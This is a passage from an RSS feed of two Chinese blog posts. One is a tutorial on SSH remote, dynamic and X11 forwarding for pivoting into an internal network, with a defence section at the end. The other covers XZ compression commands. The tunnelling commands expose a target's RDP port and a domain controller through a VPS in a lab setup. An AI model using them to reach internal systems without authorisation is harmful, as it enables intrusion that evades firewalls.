&lt;p&gt;在web服务器上执行如下命令：&lt;/p&gt;
&lt;p&gt;ssh -fNg -R &amp;lt;listen port&amp;gt;:&amp;lt;remote ip&amp;gt;:&amp;lt;remote port&amp;gt; user@&amp;lt;SSH server&amp;gt; -p &amp;lt;ssh server port&amp;gt;&lt;/p&gt;
&lt;p&gt;ssh -fCNg -R 1521(vps端口):192.168.190.136(目标主机):3389 root@192.168.190.110&lt;/p&gt;

&lt;div&gt;&lt;img src=&quot;https://note.youdao.com/yws/public/resource/0def327b65c5f53a90015bd554b04a77/xmlnote/8CBA3D82A7E14E6D9CCC683616FFD514/80378&quot; alt=&quot;&quot; data-media-type=&quot;image&quot; data-original=&quot;https://note.youdao.com/yws/public/resource/0def327b65c5f53a90015bd554b04a77/xmlnote/8CBA3D82A7E14E6D9CCC683616FFD514/80378&quot;/&gt;&lt;/div&gt;
&lt;p&gt;netstat -anptl | grep 1521 查看远程vps(192.168.190.110)发现已经开启对1521端口的监听&lt;/p&gt;
&lt;div&gt;&lt;img src=&quot;https://note.youdao.com/yws/public/resource/0def327b65c5f53a90015bd554b04a77/xmlnote/3707A5CBD13C4674AA40337950C08894/80390&quot; alt=&quot;&quot; data-media-type=&quot;image&quot; data-original=&quot;https://note.youdao.com/yws/public/resource/0def327b65c5f53a90015bd554b04a77/xmlnote/3707A5CBD13C4674AA40337950C08894/80390&quot;/&gt;&lt;/div&gt;
&lt;p&gt;rdesktop 127.0.0.1:1521 访问vps的1521端口，即可与数据库服务器的3389端口建立连接。&lt;/p&gt;
&lt;div&gt;&lt;img src=&quot;https://note.youdao.com/yws/public/resource/0def327b65c5f53a90015bd554b04a77/xmlnote/67A69564D8E24CC8A7853E66CDB246CB/80403&quot; alt=&quot;&quot; data-media-type=&quot;image&quot; data-original=&quot;https://note.youdao.com/yws/public/resource/0def327b65c5f53a90015bd554b04a77/xmlnote/67A69564D8E24CC8A7853E66CDB246CB/80403&quot;/&gt;&lt;/div&gt;
&lt;p&gt;总结：本地转发是在本地监听并将远程主机某个端口的数据转发到本地服务器的指定端口。远程端口转发则是在远程主机上监听一个端口，所有访问远程服务器指定端口的数据都会通过ssh隧道传输到本地的对应端口上。&lt;/p&gt;

&lt;p&gt;3.动态转发&lt;/p&gt;
&lt;p&gt;测试环境如下：&lt;/p&gt;
&lt;div&gt;&lt;img src=&quot;https://note.youdao.com/yws/public/resource/0def327b65c5f53a90015bd554b04a77/xmlnote/1FFB1C9546AC415D94EC07EDE3C09191/80383&quot; alt=&quot;&quot; data-media-type=&quot;image&quot; data-original=&quot;https://note.youdao.com/yws/public/resource/0def327b65c5f53a90015bd554b04a77/xmlnote/1FFB1C9546AC415D94EC07EDE3C09191/80383&quot;/&gt;&lt;/div&gt;
&lt;p&gt;在vps上执行如下命令,建立一个动态的socks代理通道&lt;/p&gt;

&lt;p&gt;查看本地7000端口的监听是否已经启动，可以看到ssh正在监听7000端口。&lt;/p&gt;
&lt;div&gt;&lt;img src=&quot;https://note.youdao.com/yws/public/resource/0def327b65c5f53a90015bd554b04a77/xmlnote/40DB8D09A68E4D1E89E17F6EA0369F48/80413&quot; alt=&quot;&quot; data-media-type=&quot;image&quot; data-original=&quot;https://note.youdao.com/yws/public/resource/0def327b65c5f53a90015bd554b04a77/xmlnote/40DB8D09A68E4D1E89E17F6EA0369F48/80413&quot;/&gt;&lt;/div&gt;
&lt;p&gt;然后，在本地打开浏览器并设置网络代理，通过浏览器访问内网域控制器（192.168.190.132）。&lt;/p&gt;
&lt;div&gt;&lt;img src=&quot;https://note.youdao.com/yws/public/resource/0def327b65c5f53a90015bd554b04a77/xmlnote/4DA7110903754B1DB4733AA5AA94AFE5/80416&quot; alt=&quot;&quot; data-media-type=&quot;image&quot; data-original=&quot;https://note.youdao.com/yws/public/resource/0def327b65c5f53a90015bd554b04a77/xmlnote/4DA7110903754B1DB4733AA5AA94AFE5/80416&quot;/&gt;&lt;/div&gt;

&lt;div&gt;&lt;img src=&quot;https://note.youdao.com/yws/public/resource/0def327b65c5f53a90015bd554b04a77/xmlnote/50D807612B9F4BC7AA4B44537C7ED41E/80418&quot; alt=&quot;&quot; data-media-type=&quot;image&quot; data-original=&quot;https://note.youdao.com/yws/public/resource/0def327b65c5f53a90015bd554b04a77/xmlnote/50D807612B9F4BC7AA4B44537C7ED41E/80418&quot;/&gt;&lt;/div&gt;
&lt;p&gt;总结：动态端口映射就是建立一个ssh加密的socks代理通道。任何支持socks4/5协议的程序都可以使用这个加密隧道进行代理访问。&lt;/p&gt;

&lt;p&gt;4.X协议转发&lt;/p&gt;
&lt;p&gt;1.远程登陆 Linux GUI 运行图形化界面工具，类似于VNC和X windows。&lt;/p&gt;
&lt;p&gt;2.防火墙限制访问时，可以尝试通过 SSH 的 X 转发&lt;/p&gt;


&lt;p&gt;X协议转发测试&lt;/p&gt;
&lt;p&gt;可以使用远程主机的图像化工具&lt;/p&gt;

&lt;div&gt;&lt;img src=&quot;https://note.youdao.com/yws/public/resource/0def327b65c5f53a90015bd554b04a77/xmlnote/F2A18C0E1B45410BB88E8322555BCC43/80424&quot; alt=&quot;&quot; data-media-type=&quot;image&quot; data-original=&quot;https://note.youdao.com/yws/public/resource/0def327b65c5f53a90015bd554b04a77/xmlnote/F2A18C0E1B45410BB88E8322555BCC43/80424&quot;/&gt;&lt;/div&gt;

&lt;p&gt; 5.ssh隧道防御&lt;/p&gt;
&lt;p&gt;ssh隧道之所以能被攻击者利用，主要是因为系统访问控制措施不够。在系统中配置ssh远程管理白名单，在ACL中限制只有特定的ip地址才能连接ssh，以及设置系统完全使用带外管理等方法，都可以避免这一问题。如果没有足够的资源来建立带外管理的网络结构，在内网中至少要限制ssh远程登录的地址和双向访问控制策略（从外部到内部、从内部到外部）。&lt;/p&gt;
</description>
<pubDate>Sun, 02 Feb 2020 12:41:00 +0000</pubDate>
<dc:creator>Micr067</dc:creator>
<og:description>在内网中几乎所有的linux服务器和网络设备都支持ssh协议。一般情况下，ssh协议是允许通过防火墙和边界设备的，所以经常被攻击者利用。同时ssh协议的传输过程是加密的，所以我们很难区分合法的ssh会</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/micr067/p/12253615.html</dc:identifier>
</item>
<item>
<title>Linux  高压缩率工具 XZ 压缩详解 - 自由早晚乱余生</title>
<link>http://www.cnblogs.com/operationhome/p/12253549.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/operationhome/p/12253549.html</guid>
<description>&lt;h2 id=&quot;一xz-基础信息&quot;&gt;一、XZ 基础信息&lt;/h2&gt;
&lt;p&gt;XZ 压缩比比较高，在这里没有进行详细对比。&lt;/p&gt;
&lt;p&gt;官网链接： &lt;a href=&quot;https://tukaani.org/xz/&quot; class=&quot;uri&quot;&gt;https://tukaani.org/xz/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;官网介绍到： 压缩后的文件大小 gzip 小30％，比bzip2小15％。&lt;/p&gt;
&lt;p&gt;我测试 一个 112M 的文件，xz 压缩完后 4.5M, gz 压缩完后 16M, biz2 缩完后7.6M.&lt;br/&gt;压缩比： xz &amp;gt;biz2 &amp;gt; gzip&lt;/p&gt;
&lt;h2 id=&quot;二安装&quot;&gt;二、安装&lt;/h2&gt;
&lt;pre&gt;
&lt;code&gt;yum install epel-release
yum  install  xz &lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;三详解&quot;&gt;三、详解&lt;/h2&gt;
&lt;h3 id=&quot;常用的参数&quot;&gt;3.1、常用的参数&lt;/h3&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;默认压缩后的文件后缀为 xz&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre class=&quot;shell&quot;&gt;
&lt;code&gt;-z  强制执行压缩, 默认不保留源文件。压缩后的文件名为源文件.xz
-d  强制执行解压缩
-l  列出压缩文件的信息
-k  保留源文件不要删除
-f  强制覆盖输出文件和压缩链接
-c  写入到标准输出，输入文件不要删除
-0..-9  压缩比例，默认为6
-e  使用更多的 CPU time 来进行压缩，提高压缩率。不会影响解压时所需要的内存。
-T  指定线程数，默认是 1 ，当设置为 0 时使用和机器核心一样多的线程。
--format=  指定压缩输出格式，可以是 raw、xz、lzma
-v  显示更详细的信息&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;注意点： 压缩后的文件时在和源文件同一个目录。当我们压缩的文件为 /home/nginx/logs/error.log-20191126 ，当我们在任意目录执行完 &lt;code&gt;xz /home/nginx/logs/error.log-20191126&lt;/code&gt; 后，压缩后的文件路径是 &lt;code&gt;/home/nginx/logs/error.log-20191126.xz&lt;/code&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;常用命令&quot;&gt;3.2、 常用命令&lt;/h3&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;xz 进行压缩的时候，默认使用的内存为 总内存的 5% 左右。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;&lt;li&gt;压缩文件(源文件不保留)&lt;/li&gt;
&lt;/ul&gt;&lt;pre class=&quot;shell&quot;&gt;
&lt;code&gt;xz   /home/nginx/logs/error.log-20191126&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;压缩文件(源文件保留)&lt;/li&gt;
&lt;/ul&gt;&lt;pre class=&quot;shell&quot;&gt;
&lt;code&gt;xz -k /home/nginx/logs/error.log-20191126&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;压缩的时候设定最大使用内存 &lt;code&gt;--memlimit-compress=&lt;/code&gt; 示例：--mem‐&lt;br/&gt;limit-compress=80MiB&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;&lt;li&gt;解压缩文件&lt;/li&gt;
&lt;/ul&gt;&lt;pre class=&quot;shell&quot;&gt;
&lt;code&gt;xz -d  /home/nginx/logs/error.log-20191126.xz&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;或者&lt;/p&gt;
&lt;pre class=&quot;shell&quot;&gt;
&lt;code&gt;unxz  /home/nginx/logs/error.log-20191126.xz &lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;解压缩的时候设定最大使用内存 &lt;code&gt;--memlimit-decompress=&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;&lt;li&gt;指定多线程数来进行压缩&lt;/li&gt;
&lt;/ul&gt;&lt;pre class=&quot;shell&quot;&gt;
&lt;code&gt;xz -T 4  /home/nginx/logs/error.log-20191126&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;四扩展&quot;&gt;四、扩展&lt;/h2&gt;
&lt;h3 id=&quot;unxz&quot;&gt;4.1、unxz&lt;/h3&gt;
&lt;p&gt;xz 压缩包的解压命令&lt;/p&gt;
&lt;h3 id=&quot;xzcat&quot;&gt;4.2、xzcat&lt;/h3&gt;
&lt;p&gt;xz --decompress --stdout&lt;br/&gt;查看压缩文件的内容&lt;/p&gt;
&lt;h3 id=&quot;lzma&quot;&gt;4.3、lzma&lt;/h3&gt;
&lt;p&gt;xz --format=lzma&lt;br/&gt;压缩格式为 lzma&lt;/p&gt;
&lt;h3 id=&quot;unlzma&quot;&gt;4.4、unlzma&lt;/h3&gt;
&lt;p&gt;xz --format=lzma --decompress&lt;br/&gt;解压 压缩格式为 lzma 的压缩包&lt;/p&gt;
&lt;h3 id=&quot;lzcat&quot;&gt;4.5、lzcat&lt;/h3&gt;
&lt;p&gt;xz --format=lzma --decompress --stdout&lt;/p&gt;
</description>
<pubDate>Sun, 02 Feb 2020 12:30:00 +0000</pubDate>
<dc:creator>自由早晚乱余生</dc:creator>
<og:description>[toc] 一、XZ 基础信息 XZ 压缩比比较高，在这里没有进行详细对比。 官网链接： https://tukaani.org/xz/ 官网介绍到： 压缩后的文件大小 gzip 小30％，比bzip</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/operationhome/p/12253549.html</dc:identifier>
</item>
</channel>
</rss>